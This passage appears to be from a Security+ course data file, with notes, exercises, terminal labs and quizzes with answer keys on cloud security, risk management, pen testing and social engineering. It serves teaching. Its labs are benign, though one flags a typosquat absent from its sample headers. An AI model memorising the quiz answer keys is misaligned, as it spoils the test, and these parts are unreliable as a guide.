usage including Shadow IT and DLP enforcement", "C. Virtual private networking for cloud connectivity", "D. Vulnerability scanning for cloud VMs"], answer: "B", explain: "CASB: sits between users and cloud services. Provides: visibility into all cloud app usage, shadow IT discovery, DLP policy enforcement, access control, threat protection. Enforces corporate policies on both sanctioned and unsanctioned cloud services." }, { q: "The customer is ALWAYS responsible for in cloud:", opts: ["A. Physical server security", "B. Hypervisor patching", "C. Data classification and identity/access management", "D. Network infrastructure"], answer: "C", explain: "Regardless of IaaS/PaaS/SaaS model, the customer always owns: (1) Their data and its classification. (2) Identity and access management. (3) Client-side security. Everything else shifts to provider as you move from IaaS → PaaS → SaaS." }, { q: "VM escape is critical because:", opts: ["A. VMs cannot be recovered after escape", "B. An exploited VM can compromise the hypervisor and all other VMs on the same host", "C. VM escape permanently corrupts data", "D. It is impossible to detect"], answer: "B", explain: "VM escape: attacker breaks out of the guest VM boundary. Access to hypervisor = access to ALL VMs on that host. In multi-tenant cloud environments, this means one customer's VM could access another's data. Extremely severe. Mitigation: patch hypervisors immediately, separate sensitive workloads." }, { q: "Docker --privileged flag risk:", opts: ["A. Container cannot access the internet", "B. Container gets near-complete access to host — can escape to host and compromise everything", "C. Container uses more CPU", "D. Image builds are slower"], answer: "B", explain: "Privileged containers can: mount the host filesystem, modify kernel parameters, access all devices, escape namespace isolation. Effectively no security boundary. Only use if absolutely unavoidable and with full understanding of the risk. Never in multi-tenant or production environments." }, { q: "AWS Security Group vs NACL:", opts: ["A. Security Groups are stateless; NACLs are stateful", "B. Security Groups are stateful (instance level); NACLs are stateless (subnet level)", "C. They are identical", "D. NACLs operate at Layer 7; Security Groups at Layer 3"], answer: "B", explain: "Security Group: stateful, applied per-instance. Return traffic automatically allowed. NACL: stateless, applied per-subnet. Must explicitly allow both inbound and outbound. Security Groups for granular instance control. NACLs for subnet-level defence in depth." }, { q: "Hybrid cloud deployment uses:", opts: ["A. Only public cloud infrastructure", "B. Mix of public and private cloud — sensitive workloads on private, burst capacity on public", "C. Multiple public cloud providers", "D. Physical hardware only"], answer: "B", explain: "Hybrid cloud: private cloud for sensitive/regulated workloads (patient data, financial records), public cloud for web tiers, burst capacity, dev/test environments. Best of both: control where needed, cost efficiency where not." }, { q: "Container images should be scanned for CVEs because:", opts: ["A. Containers are never patched after deployment", "B. Images often contain outdated packages with known vulnerabilities — scan before deploying", "C. Scanning is required by all container runtimes", "D. CVE scanning slows image pull speed"], answer: "B", explain: "Container images are built on base images (ubuntu:20.04, python:3.9) that may have known CVEs. Running a container with vulnerable software is as dangerous as running an unpatched server. Integrate CVE scanning into CI/CD pipeline — block deployment if critical CVEs found." }, { q: "VM sprawl creates security risk because:", opts: ["A. Too many VMs slow down the network", "B. Forgotten, unmanaged VMs are unpatched and potentially compromised entry points", "C. VMs consume too much storage", "D. More VMs means more potential for VM escape"], answer: "B", explain: "VM sprawl: VMs created for temporary purposes, then forgotten. No one owns them, patches them, or monitors them. These 'ghost VMs' have unpatched OS vulnerabilities and may still be network-accessible. Regular VM inventory and decommissioning governance is essential." } ] }, { id: "9-35", week: 9, day: 35, phase: "Security+", color: "#f472b6", title: "Risk Management, Compliance & Governance", objective: "Master risk assessment methodologies, understand key frameworks and regulations, and know how to implement a risk management programme.", messer: "Professor Messer SY0-701 — 5.1 Security Governance", notes: `## Risk Management Framework\n\n**Risk = Threat × Vulnerability × Asset Value**\n\n**Quantitative Risk Assessment:**\n- **AV (Asset Value):** What is the asset worth?\n- **EF (Exposure Factor):** What percentage of asset is lost if the threat occurs? (0-100%)\n- **SLE (Single Loss Expectancy):** AV × EF = loss from one incident\n- **ARO (Annual Rate of Occurrence):** How often does this threat occur per year?\n- **ALE (Annual Loss Expectancy):** SLE × ARO = expected annual loss\n\nExample: Server worth $100,000, EF=25% (partial damage), ARO=0.5 (once every 2 years)\nSLE = $100,000 × 25% = $25,000\nALE = $25,000 × 0.5 = $12,500/year\n\n**Qualitative Risk Assessment:** Uses descriptive ratings: High/Medium/Low or 1-5 scales. Faster but less precise.\n\n---\n\n## Risk Response Strategies\n\n**Risk avoidance:** Eliminate the activity that causes the risk. Stop collecting SSNs. Don't use the risky technology.\n\n**Risk mitigation:** Reduce the probability or impact. Patch, add controls, segment network.\n\n**Risk transference:** Shift financial impact to another party. Cyber insurance. Third-party contract.\n\n**Risk acceptance:** Acknowledge and accept the risk. Residual risk after controls. Document formally.\n\n---\n\n## Key Security Frameworks\n\n**NIST Cybersecurity Framework (CSF):** Identify, Protect, Detect, Respond, Recover. Voluntary, flexible.\n\n**ISO 27001:** International standard for Information Security Management Systems (ISMS). Certifiable.\n\n**NIST 800-53:** Security and privacy controls for federal information systems.\n\n**SOC 2:** Auditing standard for service organisations. Trust Service Criteria: Security, Availability, Confidentiality, Processing Integrity, Privacy.\n\n**CIS Controls:** Prioritised security best practices (18 controls). Practical implementation guidance.\n\n---\n\n## Key Regulations and Compliance\n\n**GDPR (General Data Protection Regulation):** EU law. Data privacy rights, breach notification within 72 hours, right to erasure.\n\n**HIPAA (Health Insurance Portability and Accountability Act):** US law. Protected Health Information (PHI). Requires safeguards for patient data.\n\n**PCI DSS (Payment Card Industry Data Security Standard):** Industry standard for handling card data. 12 requirements. Quarterly scans, annual audits.\n\n**SOX (Sarbanes-Oxley):** US law. Financial controls, CEO/CFO certify financial accuracy. IT controls for financial data.\n\n**CCPA (California Consumer Privacy Act):** California law. Consumer data rights similar to GDPR for California residents.\n\n---\n\n## Business Impact Analysis (BIA)\n\n**Purpose:** Identify critical business processes and the impact of their disruption.\n\n**Key outputs:**\n- **MTD (Maximum Tolerable Downtime):** Longest a process can be down before business impact is unacceptable\n- **RTO (Recovery Time Objective):** Target time to restore a system\n- **RPO (Recovery Point Objective):** Maximum acceptable data loss\n- **MTTR (Mean Time To Repair):** Average repair time\n\nRTO must be less than or equal to MTD.`, exercise: { title: "Risk Management Calculations and Scenarios", instructions: "Apply risk management concepts to each scenario.", items: [ "A database server is worth $500,000. A fire could destroy 50% of its value. Fire occurs every 10 years. Calculate SLE and ALE.", "A company is considering buying $20,000/year cyber insurance for a risk with ALE of $15,000. Is this financially justified?", "A company decides to stop accepting cash payments to eliminate cash theft risk. What risk response strategy?", "GDPR requires breach notification within how many hours? What is the penalty for non-compliance?", "PCI DSS applies to which type of organisations?", "A CISO wants to implement NIST CSF. What are the five functions?", "RTO must be less than what metric? Why?", "SOC 2 vs ISO 27001 — when would you choose each?" ], answer: `1. SLE = AV × EF = $500,000 × 50% = $250,000. ARO = 1/10 = 0.1 (once every 10 years). ALE = SLE × ARO = $250,000 × 0.1 = $25,000/year. This means the organisation expects to lose $25,000 per year on average from fire risk to this server. 2. Not justified purely on financial basis. ALE = $15,000/year (expected annual loss). Insurance = $20,000/year. The insurance costs more than the expected loss. However, insurance has non-financial value: predictable costs, access to incident response services, legal representation. Pure quantitative analysis says no; business and compliance factors may override. 3. Risk avoidance. By eliminating cash payments entirely, the cash theft risk is removed at the source. No cash = no cash theft. Risk avoidance is the most complete risk response but often eliminates business functionality with it. 4. 72 hours. GDPR Article 33 requires notification to the supervisory authority within 72 hours of discovering a breach. Article 34 may require notification to affected individuals "without undue delay." Penalties: up to €20 million or 4% of annual global turnover, whichever is higher. 5. Any organisation that processes, stores, or transmits payment card data (credit, debit). Merchants, payment processors, financial institutions. 12 requirements covering network security, access control, encryption, monitoring, and testing. Compliance validated by QSA (Qualified Security Assessor) or Self-Assessment Questionnaire. 6. NIST CSF five functions: Identify (asset inventory, risk assessment), Protect (access control, training, encryption), Detect (monitoring, anomaly detection), Respond (response planning, communication), Recover (recovery planning, improvements). These span the full security lifecycle. 7. RTO must be ≤ MTD (Maximum Tolerable Downtime). MTD defines the longest acceptable outage before the business impact becomes catastrophic. If MTD is 4 hours, the RTO must be 4 hours or less. Having RTO > MTD means the business will suffer unacceptable damage before systems are restored. 8. SOC 2: US-focused, for service organisations providing services to other businesses (SaaS, cloud providers). B2B sales process — customers request SOC 2 Type II reports. ISO 27001: international standard, certifiable, recognised globally. Better for international markets, regulatory requirements. Both demonstrate security maturity but to different audiences.` }, practical: { title: "Risk Calculation Lab", platform: "Linux terminal", steps: [ { instruction: "Build a risk calculation tool", command: `python3 << 'EOF' def calculate_risk(asset_name, asset_value, exposure_factor, occurrences_per_year, control_cost=0): SLE = asset_value * (exposure_factor / 100) ALE = SLE * occurrences_per_year print(f"\nRisk Assessment: {asset_name}") print(f" Asset Value (AV): {asset_value:>12,.0f}") print(f" Exposure Factor (EF): {exposure_factor:>11.0f}%") print(f" Single Loss Expectancy: {SLE:>12,.0f}") print(f" Annual Rate (ARO): {occurrences_per_year:>11.2f}x/year") print(f" Annual Loss Expectancy: {ALE:>12,.0f}/year") if control_cost > 0: if control_cost < ALE: print(f" Control Cost: {control_cost:>12,.0f}/year") print(f" Net Savings: {ALE-control_cost:>12,.0f}/year") print(f" RECOMMENDATION: Implement control (cost < ALE)") else: print(f" Control Cost: {control_cost:>12,.0f}/year") print(f" Net Loss from control: {control_cost-ALE:>12,.0f}/year") print(f" RECOMMENDATION: Accept risk (cost > ALE)") return ALE print("=" * 50) print("QUANTITATIVE RISK ASSESSMENT TOOL") print("=" * 50) # Example scenarios calculate_risk("Customer Database", 2_000_000, 100, 0.1, control_cost=50_000) calculate_risk("Web Server", 500_000, 30, 2, control_cost=10_000) calculate_risk("Laptop Fleet", 200_000, 10, 5, control_cost=5_000) EOF`, explain: "Quantitative risk assessment justifies security spending with numbers. If ALE=$100,000 and control costs=$20,000 — the control saves $80,000/year. If ALE=$5,000 and control costs=$50,000 — accept the risk. This is how CISOs get budget approved and justify security investments to the board." }, { instruction: "Compliance framework mapping", command: `python3 << 'EOF' # Map security controls to compliance requirements controls = { "MFA for all admin accounts": { "NIST CSF": "Protect (PR.AC-7)", "PCI DSS": "Req 8.4", "ISO 27001": "A.9.4.2", "HIPAA": "164.312(d)", "SOC 2": "CC6.1", }, "Encrypt data at rest": { "NIST CSF": "Protect (PR.DS-1)", "PCI DSS": "Req 3.4", "ISO 27001": "A.10.1.1", "HIPAA": "164.312(a)(2)(iv)", "GDPR": "Article 32", }, "Security incident response plan": { "NIST CSF": "Respond (RS.RP-1)", "PCI DSS": "Req 12.10", "ISO 27001": "A.16.1.1", "HIPAA": "164.308(a)(6)", "SOC 2": "CC7.3", }, "Access logs retained 12 months": { "NIST CSF": "Detect (DE.CM-7)", "PCI DSS": "Req 10.7", "ISO 27001": "A.12.4.1", "HIPAA": "164.312(b)", "GDPR": "Article 30", }, } print("COMPLIANCE CONTROL MAPPING") print("=" * 70) for control, frameworks in controls.items(): print(f"\n{control}:") for framework, requirement in frameworks.items(): print(f" {framework:15}: {requirement}") EOF`, explain: "Many compliance frameworks require the same underlying controls. One good implementation of MFA satisfies PCI DSS, ISO 27001, HIPAA, and SOC 2 simultaneously. Mapping controls to frameworks avoids duplicating effort and makes compliance audits more efficient." } ] }, quiz: [ { q: "ALE (Annual Loss Expectancy) is calculated as:", opts: ["A. Asset Value × Exposure Factor", "B. SLE × ARO (Single Loss Expectancy × Annual Rate of Occurrence)", "C. Asset Value ÷ Annual Rate", "D. Exposure Factor × Annual Rate"], answer: "B", explain: "ALE = SLE × ARO. SLE = AV × EF (one-time loss). ARO = frequency per year. ALE = expected annual loss. If SLE=$50,000 and ARO=0.1 (once per 10 years), ALE=$5,000/year. Controls costing less than ALE are financially justified." }, { q: "Risk transference means:", opts: ["A. Eliminating the risk activity entirely", "B. Transferring financial impact to another party — cyber insurance, contracts", "C. Reducing probability of the threat", "D. Accepting and documenting the risk"], answer: "B", explain: "Risk transference: shift financial liability. Cyber insurance: pay premiums, insurer pays if breach occurs. Contracts: vendor assumes liability for their security failures. Does not eliminate the risk — just shifts who pays if it materialises." }, { q: "GDPR breach notification must occur within:", opts: ["A. 24 hours", "B. 48 hours", "C. 72 hours", "D. 30 days"], answer: "C", explain: "GDPR Article 33: notify supervisory authority within 72 hours of discovery if breach is likely to result in risk to individuals' rights. Penalty for non-compliance: up to €20M or 4% of annual global turnover." }, { q: "PCI DSS applies to organisations that:", opts: ["A. Store any personal data", "B. Process, store, or transmit payment card data", "C. Have more than 500 employees", "D. Operate in more than one country"], answer: "B", explain: "PCI DSS: any organisation handling payment card data — merchants, processors, banks, service providers. 12 requirements validated by QSA or self-assessment. Failure can result in fines and loss of ability to process card payments." }, { q: "NIST Cybersecurity Framework's five functions are:", opts: ["A. Plan, Do, Check, Act, Improve", "B. Identify, Protect, Detect, Respond, Recover", "C. Prevent, Detect, Respond, Recover, Learn", "D. Assess, Mitigate, Monitor, Report, Comply"], answer: "B", explain: "NIST CSF: Identify (know your assets/risks), Protect (implement safeguards), Detect (identify events), Respond (take action), Recover (restore capabilities). Flexible, voluntary framework applicable to any organisation." }, { q: "MTD (Maximum Tolerable Downtime) and RTO must be:", opts: ["A. MTD ≥ RTO — RTO must be achievable within the tolerable downtime", "B. RTO > MTD always", "C. They are unrelated metrics", "D. Always equal"], answer: "A", explain: "MTD defines the maximum acceptable outage. RTO defines the target recovery time. RTO must be ≤ MTD. If MTD=4 hours, RTO must be ≤ 4 hours. An RTO of 8 hours with MTD of 4 hours means the business will suffer unacceptable damage before recovery." }, { q: "ISO 27001 certification demonstrates:", opts: ["A. Full compliance with all security regulations globally", "B. A formally audited and certified Information Security Management System meeting the standard", "C. No security incidents in the past year", "D. Government-approved security clearance"], answer: "B", explain: "ISO 27001: internationally recognised ISMS standard. Requires: risk assessment, management commitment, defined controls (Annex A), internal audits, and management review. Certification by accredited body. Demonstrates security maturity to customers, partners, and regulators." }, { q: "Qualitative vs quantitative risk assessment:", opts: ["A. Quantitative uses descriptive ratings; qualitative uses numbers", "B. Qualitative uses descriptive ratings (High/Medium/Low); quantitative uses monetary values and probabilities", "C. They are the same method", "D. Only quantitative is acceptable for compliance"], answer: "B", explain: "Qualitative: fast, uses ratings (H/M/L), good for initial prioritisation. Quantitative: uses monetary values (AV, SLE, ALE), better for business justification. Most organisations use both — qualitative for broad view, quantitative for high-value decisions." }, { q: "HIPAA primarily protects:", opts: ["A. Financial transaction data", "B. Protected Health Information (PHI) — patient data at healthcare organisations", "C. Federal government systems", "D. Payment card data"], answer: "B", explain: "HIPAA: US law protecting PHI (Protected Health Information) at covered entities (healthcare providers, insurers) and business associates. Requires: access controls, audit logging, encryption, breach notification, minimum necessary access." }, { q: "Risk acceptance means:", opts: ["A. Ignoring the risk completely", "B. Formally acknowledging and documenting the decision to accept a residual risk without further mitigation", "C. Transferring the risk to insurance", "D. The risk has been eliminated"], answer: "B", explain: "Risk acceptance: a documented business decision that the cost of mitigation exceeds the expected loss, or the risk is within tolerance. Not ignoring — actively deciding. Residual risk (risk remaining after controls) is often accepted. Must be approved by appropriate authority and documented." } ] },, { id: "10-37", week: 10, day: 37, phase: "Security+", color: "#f472b6", title: "Vulnerability Management & Penetration Testing", objective: "Master the vulnerability management lifecycle, penetration testing phases, scan types, and key tools for SY0-701.", messer: "Professor Messer SY0-701 — 4.3 Vulnerability Scanning", notes: `## Vulnerability Management Lifecycle\n\n1. Identify — discover assets and vulnerabilities\n2. Prioritise — rank by CVSS score, exploitability, asset criticality\n3. Remediate — patch, mitigate, or accept\n4. Verify — confirm remediation successful\n5. Report — compliance and management documentation\n\n---\n\n## CVSS Scoring\n\n- Critical: 9.0–10.0\n- High: 7.0–8.9\n- Medium: 4.0–6.9\n- Low: 0.1–3.9\n\nCVE format: CVE-YEAR-NUMBER (e.g. CVE-2021-44228 = Log4Shell)\n\n**Active exploitation:** Always bumps priority regardless of CVSS score. An actively exploited CVSS 7.5 patches before a CVSS 9.8 theoretical-only vulnerability.\n\n---\n\n## Vulnerability Scan Types\n\n**Credentialed:** Scanner authenticates to target. Sees installed software, patch levels, config. Deep and accurate.\n**Non-credentialed:** No auth. Only sees externally visible services. Misses most internal vulnerabilities.\n**Internal:** Run from inside the network.\n**External:** Run from outside (attacker perspective).\n**Agent-based:** Software agent on each host. Continuous, no network scanning needed.\n\n---\n\n## Penetration Testing\n\nAuthorised simulated attack. ALWAYS get written authorisation (Rules of Engagement) first.\n\n**Black box:** No prior knowledge. Most realistic attacker simulation.\n**White box:** Full knowledge. Most thorough.\n**Grey box:** Partial knowledge. Insider or partially-informed attacker.\n\n**Pen test phases:**\n1. Planning/Reconnaissance (OSINT)\n2. Scanning (active discovery)\n3. Gaining access (exploitation)\n4. Maintaining access (persistence)\n5. Covering tracks\n6. Reporting\n\n---\n\n## OSINT and Key Tools\n\nOSINT = Open Source Intelligence. Legal, passive reconnaissance:\n- DNS records, WHOIS, Certificate Transparency logs\n- Shodan (internet-connected device search engine)\n- LinkedIn, job postings (reveal tech stack)\n\n| Tool | Use |\n|------|-----|\n| Nmap | Port scanning, service/OS discovery |\n| Metasploit | Exploitation framework |\n| Burp Suite | Web app testing |\n| Nessus/OpenVAS | Vulnerability scanning |\n| Mimikatz | Windows credential extraction |\n| Aircrack-ng | Wireless testing |`, exercise: { title: "Vulnerability and Pen Test Scenarios", instructions: "Apply the correct vulnerability management or pen testing concept.", items: [ "1,200 vulnerabilities found, team patches 50/week. How to prioritise?", "Pen tester begins testing without written authorisation. What is the legal issue?", "CVSS 9.8 not exploited vs CVSS 7.5 actively exploited — which patches first?", "Credentialed vs non-credentialed scan — which finds more?", "What is Shodan and why do pen testers use it?", "Vulnerability assessment vs penetration test — what is the key difference?", "Black box vs white box — which is more realistic attacker simulation?", "OSINT is legal — name three public sources pen testers use." ], answer: `1. Prioritise: (1) Critical CVSS + actively exploited = immediate. (2) High CVSS = within 7 days. (3) Asset criticality — same score on public server patches before isolated dev box. (4) Medium = 30 days. (5) Low = next cycle. 2. Unauthorised access is illegal (CFAA, Computer Misuse Act) regardless of intent. Rules of Engagement must be signed defining scope, dates, allowed methods, and emergency contacts. 3. CVSS 7.5 actively exploited patches first. Active exploitation means real attacks happening NOW. Probability of exploitation is certain. CVSS 9.8 theoretical waits. 4. Credentialed scan finds significantly more. Sees: installed software versions, patch levels, registry settings, config files. Non-credentialed only sees externally exposed services. 5. Shodan indexes internet-connected devices via banner grabbing. Finds: forgotten servers, open databases, IP cameras, SCADA systems with no auth. Passive reconnaissance — no traffic sent to target. 6. Vulnerability assessment: automated scanning, identifies vulnerabilities, no exploitation. Penetration test: actually exploits vulnerabilities, chains weaknesses, demonstrates real attack paths and business impact. 7. Black box. No prior knowledge = simulates real external attacker who discovers everything from scratch. White box (full knowledge) is most thorough for finding vulnerabilities. 8. DNS records (dig, dnsdumpster), WHOIS registration data, Certificate Transparency logs (crt.sh reveals subdomains), LinkedIn (org structure, tech stack), job postings (exact technology versions).` }, practical: { title: "Vulnerability Discovery Lab", platform: "Linux terminal", steps: [ { instruction: "Perform vulnerability-style scanning", command: `sudo apt install nmap -y 2>/dev/null echo "=== SERVICE VERSION SCAN ===" sudo nmap -sV -sC localhost 2>/dev/null | grep -E "PORT|STATE|SERVICE" | head -15 echo -e "\n=== VULNERABILITY SCRIPTS ===" sudo nmap --script vuln localhost 2>/dev/null | grep -E "VULNERABLE|CVE|PORT" | head -10 echo -e "\n=== AVAILABLE SECURITY UPDATES ===" apt list --upgradable 2>/dev/null | grep -i security | head -10`, explain: "Nmap -sV detects service versions which map directly to CVEs. --script vuln runs Nmap's vulnerability detection scripts. Listing security-tagged available updates shows what a credentialed scanner would find — all unpatched packages with known CVEs." }, { instruction: "OSINT DNS reconnaissance", command: `echo "=== DNS OSINT ===" dig +short google.com A dig +short google.com MX dig +short google.com NS dig +short TXT google.com echo -e "\n=== WHOIS ===" whois google.com 2>/dev/null | grep -E "Registrar:|Creation Date:" | head -5 echo -e "\nOSINT reveals: IP ranges, mail servers, certificate SANs, subdomains, tech stack"`, explain: "DNS OSINT is completely legal — all records are public. Pen testers use it to map the attack surface: A records reveal IPs, MX records reveal email infrastructure, TXT records reveal security config (SPF, DKIM, DMARC), NS records reveal hosting. All before sending a single packet to the target." } ] }, quiz: [ { q: "CVSS score of 9.8 means:", opts: ["A. High severity", "B. Critical severity — 9.0-10.0 range", "C. Medium with active exploitation", "D. Score requires patch within 90 days"], answer: "B", explain: "CVSS: 9.0-10.0=Critical, 7.0-8.9=High, 4.0-6.9=Medium, 0.1-3.9=Low. Critical vulnerabilities should be patched within 24-72 hours, especially if actively exploited in the wild." }, { q: "Pen test must always begin with:", opts: ["A. Active port scanning", "B. Written authorisation (Rules of Engagement)", "C. OSINT reconnaissance", "D. Vulnerability scanning"], answer: "B", explain: "No written authorisation = criminal activity under computer fraud laws. Rules of Engagement must define: scope (specific IPs/domains), dates, allowed test types, emergency contact, handling of discovered data. Sign before ANY testing begins." }, { q: "Credentialed vulnerability scan advantage:", opts: ["A. Runs faster", "B. Sees installed software versions, patch levels, and configurations — finds internal vulnerabilities", "C. No network access needed", "D. Less invasive"], answer: "B", explain: "Credentialed: authenticates to target (admin credentials). Can read: registry, package database, config files, patch levels. Finds everything a local admin can see. Non-credentialed: only sees externally visible services — misses most vulnerabilities." }, { q: "Black box penetration test simulates:", opts: ["A. Insider with full access", "B. External attacker with no prior knowledge", "C. Vendor with partial knowledge", "D. Automated scanning tool"], answer: "B", explain: "Black box: tester has zero prior knowledge — no diagrams, no credentials, no org charts. Must discover everything from scratch, exactly like a real attacker. Most realistic threat simulation." }, { q: "Shodan is used for:", opts: ["A. Password cracking", "B. OSINT — finding internet-connected devices, open services, and banner information", "C. Exploit delivery", "D. Wireless scanning"], answer: "B", explain: "Shodan: search engine for internet-connected devices. Indexes via banner grabbing. Finds: web servers, databases (MongoDB with no auth), cameras, SCADA systems, IoT devices. Passive OSINT — no traffic sent to target." }, { q: "Vulnerability assessment differs from penetration testing in that:", opts: ["A. Assessment is more expensive", "B. Assessment identifies vulnerabilities without exploiting; pen test actively exploits to prove impact", "C. Pen testing is automated only", "D. They are identical"], answer: "B", explain: "Vulnerability assessment: automated scanning, identifies potential weaknesses, no exploitation, lower risk, faster. Penetration test: actively exploits, chains vulnerabilities, demonstrates real business impact, more comprehensive, longer, some disruption risk." }, { q: "OSINT reconnaissance is:", opts: ["A. Illegal hacking", "B. Legal collection of publicly available information", "C. Only legal with the target organisation's permission", "D. Passive exploitation"], answer: "B", explain: "OSINT collects publicly available information — DNS records, WHOIS, job postings, social media, certificate transparency, Shodan data. All is public. Legal before any testing. Pen testers use OSINT to map attack surface before active scanning." }, { q: "The vulnerability window is:", opts: ["A. CVSS score range", "B. Time between disclosure and patch deployment — period of exposure", "C. Time a user is vulnerable to phishing", "D. Patch testing period"], answer: "B", explain: "Vulnerability window: gap between public vulnerability disclosure and your patch deployment. During this window, attackers actively target the known CVE. Minimising this window is the core goal of patch management." }, { q: "CVE format is:", opts: ["A. CVE-SEVERITY-NUMBER", "B. CVE-YEAR-NUMBER (e.g. CVE-2021-44228)", "C. CVE-VENDOR-PRODUCT", "D. CVE-SCORE-ID"], answer: "B", explain: "CVE format: CVE-YEAR-NNNNN. CVE-2021-44228 = Log4Shell (discovered/published 2021, assigned number 44228). The NVD adds CVSS scores and other metadata to CVE entries." }, { q: "Rules of Engagement for pen testing must include:", opts: ["A. The tools the tester must use", "B. Scope, test dates, authorised systems, emergency contacts, out-of-scope systems", "C. Client budget", "D. Whether the test succeeded"], answer: "B", explain: "Rules of Engagement: signed legal document. Must define: in-scope systems (specific IPs/domains/apps), out-of-scope systems, allowed test types (DoS? Social engineering?), test dates/windows, emergency stop procedure and contact. Protects both parties legally." } ] }, { id: "10-38", week: 10, day: 38, phase: "Security+", color: "#f472b6", title: "Physical Security & Social Engineering", objective: "Understand physical controls, comprehensive social engineering, influence techniques, and building effective security awareness programmes.", messer: "Professor Messer SY0-701 — 2.1 Social Engineering", notes: `## Physical Security Controls\n\n**Perimeter:** Fencing, bollards, lighting, guards, CCTV, security signage.\n\n**Building access:**\n- Mantrap (access control vestibule): two interlocked doors. First closes before second opens. One person per cycle. Prevents tailgating.\n- Turnstiles: one person per badge scan.\n- Badge readers, biometric scanners.\n\n**Internal:** Restricted area signs, cable locks, privacy screens (prevent shoulder surfing), clean desk policy.\n\n**Environmental:** HVAC, fire suppression (FM-200/CO2 — NOT water in server rooms), UPS, generator, Faraday cage.\n\n---\n\n## Social Engineering Attack Types\n\n**Phishing:** Mass deceptive email.\n**Spear phishing:** Targeted, personalised.\n**Whaling:** Targets executives.\n**Vishing:** Voice/phone calls.\n**Smishing:** SMS text messages.\n**BEC:** Business Email Compromise — spoofed executive requesting wire transfer.\n**Watering hole:** Compromise site the target visits.\n**Typosquatting:** Register near-identical domain (paypa1.com).\n**Baiting:** Leave infected USB drives as traps.\n**Tailgating:** Follow through secure door.\n**Pretexting:** Create false scenario to manipulate.\n\n---\n\n## Influence Techniques (Cialdini)\n\n- **Authority:** Impersonate CEO, IT, government — people comply with authority.\n- **Urgency:** "Act NOW or your account is locked" — prevents critical thinking.\n- **Social proof:** "Everyone else has already submitted credentials."\n- **Liking:** Build rapport first, then make the ask.\n- **Reciprocity:** Do something for them first, creates obligation.\n\n---\n\n## Email Security: SPF, DKIM, DMARC\n\n**SPF:** Lists authorised mail servers for the domain. Prevents IP spoofing.\n**DKIM:** Cryptographically signs email content. Proves email wasn\'t altered.\n**DMARC:** Policy for handling SPF/DKIM failures: p=none (monitor), p=quarantine (spam), p=reject (block spoofed mail).\n\nWithout DMARC p=reject: anyone can spoof your domain for BEC attacks.\n\n---\n\n## Security Awareness Programme\n\n1. Simulated phishing with immediate feedback (most effective)\n2. Role-based security training\n3. Clear reporting mechanism\n4. Track metrics: click rate, report rate, repeat offenders\n5. Physical security reminders (clean desk, badge awareness)`, exercise: { title: "Physical and Social Engineering Scenarios", instructions: "Identify the attack and mitigation for each scenario.", items: [ "An attacker follows an employee through a secured door. What attack and prevention?", "Employee gets a call from 'Microsoft Support' claiming virus found, requesting remote access. What technique?", "Finance receives email from CEO requesting urgent wire transfer to a new supplier. What attack?", "Attacker registers amaz0n-support.com. What attack type?", "What makes a watering hole attack harder to defend than direct phishing?", "Most effective control to reduce phishing susceptibility?", "DMARC p=reject does what?", "What is a clean desk policy and what threat does it mitigate?" ], answer: `1. Tailgating (piggybacking). Prevention: mantrap — two interlocked doors, only one person per cycle. Turnstiles for single-person entry. Guards checking badges at the entry point. 2. Vishing + pretexting. Creates authority (Microsoft), urgency (virus found), and requests remote access. Microsoft NEVER calls unsolicited. Training: hang up, call official Microsoft number. Never grant unsolicited remote access. 3. BEC (Business Email Compromise). Executive email spoofed or compromised. Controls: dual authorisation for wire transfers, verify requests via phone on a known number, DMARC/DKIM/SPF authentication. 4. Typosquatting. Zero (0) instead of 'o'. Users mistype or click crafted link. Mitigation: register common typosquats of your domain, user training, email link scanning. 5. Watering hole targets a legitimate website the victim NORMALLY trusts and visits. No reason for suspicion. Defence requires web proxy reputation filtering, browser isolation, or EDR detecting drive-by downloads — unlike phishing where training directly applies. 6. Simulated phishing with immediate feedback. When user clicks, they receive training on what clues they missed. Experiential learning + immediate consequence = highest behaviour change. Pair with easy reporting mechanism. 7. DMARC p=reject: emails from your domain failing SPF/DKIM checks are rejected at the recipient server. Spoofed emails never reach recipients. Eliminates technical basis for email spoofing of your domain. 8. Clean desk policy: clear all sensitive documents, notes, and removable media from desks at end of day. Mitigates: shoulder surfing by visitors/cleaners, theft of printed documents, photography of sensitive info, post-it notes with passwords.` }, practical: { title: "Email Security Analysis Lab", platform: "Linux terminal", steps: [ { instruction: "Analyse email headers for phishing indicators", command: `python3 << 'EOF' headers = """From: CEO John Smith Reply-To: payments@wire-transfer.net Subject: URGENT: Wire Transfer Needed Today Received: from mail.attacker.ru Message-ID: <123@attacker.ru>""" print("PHISHING HEADER ANALYSIS") print("=" * 45) indicators = [ ("Typosquatted domain", "c0mpany.com (zero not O)", "CRITICAL"), ("Reply-To mismatch", "wire-transfer.net redirects replies", "CRITICAL"), ("Urgency keyword", "URGENT in subject line", "HIGH"), ("Foreign server", "Received from attacker.ru", "HIGH"), ("Message-ID domain", "attacker.ru reveals true origin", "MEDIUM"), ] for name, detail, severity in indicators: print(f" [{severity}] {name}: {detail}") print("\nVERDICT: BEC/Spear phishing attempt") EOF`, explain: "Header analysis is a core SOC skill. The From field is easily spoofed — look at Received headers for true origin. Reply-To mismatches redirect responses to attacker-controlled addresses. Typosquatted domains visible on close inspection. Urgency is a universal red flag." }, { instruction: "Check email domain security records", command: `echo "=== SPF RECORD ===" dig +short TXT google.com | grep "v=spf1" echo -e "\n=== DMARC POLICY ===" dig +short TXT _dmarc.google.com echo -e "\n=== SECURITY POSTURE ===" echo "SPF: Who can send email for this domain (blocks IP spoofing)" echo "DKIM: Cryptographic signature on email content" echo "DMARC: What to do when SPF/DKIM fail (monitor/quarantine/reject)" echo "Without DMARC p=reject: anyone can spoof this domain"`, explain: "SPF+DKIM+DMARC together form a complete anti-spoofing stack. DMARC p=reject is the end goal — without it, spoofed emails reach recipients enabling BEC. Check your own organisation's records. Missing DMARC = your domain can be spoofed for executive impersonation attacks." } ] }, quiz: [ { q: "A mantrap prevents:", opts: ["A. Badge cloning", "B. Tailgating — only one person per entry cycle through interlocked doors", "C. Physical damage to servers", "D. Insider data theft"], answer: "B", explain: "Mantrap: two interlocked doors. First must close before second opens. One person per cycle. Prevents tailgating (following authorised person through secure door). Used at data centres, secure labs, government facilities." }, { q: "BEC (Business Email Compromise) primarily uses:", opts: ["A. Malware attachments", "B. Spoofed executive email requesting wire transfers or gift cards", "C. Mass phishing campaigns", "D. SQL injection on email servers"], answer: "B", explain: "BEC: attacker spoofs or compromises executive email, contacts finance/accounting. Requests: wire transfer to new supplier, gift card purchase, payroll redirection. $43B+ losses 2016-2021 (FBI IC3). Prevention: dual authorisation, verify via phone, DMARC email authentication." }, { q: "DMARC p=reject means:", opts: ["A. Emails are encrypted before 